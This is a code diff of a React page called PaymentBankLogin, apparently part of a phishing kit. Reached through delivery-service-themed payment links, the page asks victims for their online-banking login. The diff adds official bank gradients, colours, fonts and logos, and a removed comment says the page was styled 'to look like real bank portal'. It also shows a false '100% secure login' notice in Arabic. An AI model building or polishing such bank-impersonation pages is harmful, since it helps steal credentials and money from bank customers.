@@ -4,6 +4,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { bankBranding } from "@/lib/brandingSystem";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
 import { Lock, Eye, EyeOff, Building2, ArrowLeft, ShieldCheck } from "lucide-react";
@@ -43,6 +44,9 @@ const PaymentBankLogin = () => {
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  
+  // Get bank branding for enhanced styling
+  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
 
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
@@ -269,17 +273,23 @@ const PaymentBankLogin = () => {
       description="أدخل بيانات الدخول للبنك لتأكيد العملية"
       icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
     >
-      {/* Bank Info Header - Enhanced to look like real bank portal */}
+      {/* Bank Info Header - Enhanced with Official Bank Branding */}
       <div 
-        className="rounded-xl p-5 sm:p-6 mb-6 shadow-lg border border-white/10"
+        className="rounded-xl p-5 sm:p-6 mb-6 shadow-2xl border-2"
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}dd, ${selectedBank?.color || branding.colors.secondary}dd)`,
+          background: selectedBankBranding?.gradients.primary || `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          borderColor: selectedBankBranding?.colors.accent || selectedBank?.color || branding.colors.primary,
+          borderRadius: selectedBankBranding?.borderRadius.lg || '12px',
+          boxShadow: selectedBankBranding?.shadows.lg || `0 10px 40px -10px ${selectedBank?.color || branding.colors.primary}50`
         }}
       >
         <div className="flex items-center justify-between mb-4">
           <div className="flex items-center gap-3">
             {selectedBank?.logo ? (
-              <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-lg bg-white p-2 flex items-center justify-center">
+              <div 
+                className="w-16 h-16 sm:w-20 sm:h-20 rounded-xl bg-white p-3 flex items-center justify-center shadow-lg"
+                style={{ borderRadius: selectedBankBranding?.borderRadius.md || '10px' }}
+              >
                 <img 
                   src={selectedBank.logo} 
                   alt={selectedBank.nameAr}
@@ -293,10 +303,13 @@ const PaymentBankLogin = () => {
                 <Building2 className="w-7 h-7 sm:w-8 sm:h-8 text-white" />
               </div>
             )}
-            <div className="flex-1 text-white">
-              <p className="text-xs sm:text-sm opacity-90 mb-1">الخدمات المصرفية الإلكترونية</p>
+            <div 
+              className="flex-1 text-white"
+              style={{ fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
+            >
+              <p className="text-xs sm:text-sm opacity-90 mb-1 font-medium">الخدمات المصرفية الإلكترونية</p>
               <p className="text-xl sm:text-2xl font-bold leading-tight">{selectedBank?.nameAr || 'البنك'}</p>
-              <p className="text-xs sm:text-sm opacity-80 mt-0.5">{selectedBank?.name || 'Online Banking'}</p>
+              <p className="text-xs sm:text-sm opacity-80 mt-0.5" style={{ fontFamily: selectedBankBranding?.fonts.primary || 'Arial' }}>{selectedBank?.name || 'Online Banking'}</p>
             </div>
           </div>
           {selectedCountryData && (
@@ -313,24 +326,31 @@ const PaymentBankLogin = () => {
         </div>
       </div>
 
-      {/* Security Notice - Enhanced */}
+      {/* Security Notice - Enhanced with Bank Branding */}
       <div 
         className="rounded-xl p-4 sm:p-5 mb-6 border-2"
         style={{
-          background: `linear-gradient(135deg, ${branding.colors.primary}05, ${branding.colors.primary}10)`,
-          borderColor: `${branding.colors.primary}30`
+          background: `linear-gradient(135deg, ${selectedBankBranding?.colors.primary || branding.colors.primary}08, ${selectedBankBranding?.colors.primary || branding.colors.primary}12)`,
+          borderColor: `${selectedBankBranding?.colors.primary || branding.colors.primary}30`,
+          borderRadius: selectedBankBranding?.borderRadius.md || '10px'
         }}
       >
         <div className="flex items-start gap-3">
           <div 
             className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0"
-            style={{ background: `${branding.colors.primary}20` }}
+            style={{ background: `${selectedBankBranding?.colors.primary || branding.colors.primary}20` }}
           >
-            <ShieldCheck className="w-5 h-5" style={{ color: branding.colors.primary }} />
+            <ShieldCheck className="w-5 h-5" style={{ color: selectedBankBranding?.colors.primary || branding.colors.primary }} />
           </div>
           <div className="flex-1">
             <div className="flex items-center gap-2 mb-2">
-              <h3 className="font-bold text-sm sm:text-base" style={{ color: branding.colors.primary }}>
+              <h3 
+                className="font-bold text-sm sm:text-base" 
+                style={{ 
+                  color: selectedBankBranding?.colors.primary || branding.colors.primary,
+                  fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                }}
+              >
                 تسجيل دخول آمن 100%
               </h3>
               <svg className="w-4 h-4 text-green-500" fill="currentColor" viewBox="0 0 20 20">
@@ -514,14 +534,17 @@ const PaymentBankLogin = () => {
           </button>
         </div>
         
-        {/* Submit Button */}
+        {/* Submit Button - Enhanced with Bank Branding */}
         <Button
           type="submit"
           size="lg"
-          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
+          className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-2xl"
           disabled={isSubmitting}
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
+            background: selectedBankBranding?.gradients.primary || `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+            borderRadius: selectedBankBranding?.borderRadius.md || '10px',
+            boxShadow: selectedBankBranding?.shadows.lg || `0 10px 40px -10px ${selectedBank?.color || branding.colors.primary}80`,
+            fontFamily: selectedBankBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
           }}
         >
           {isSubmitting ? (
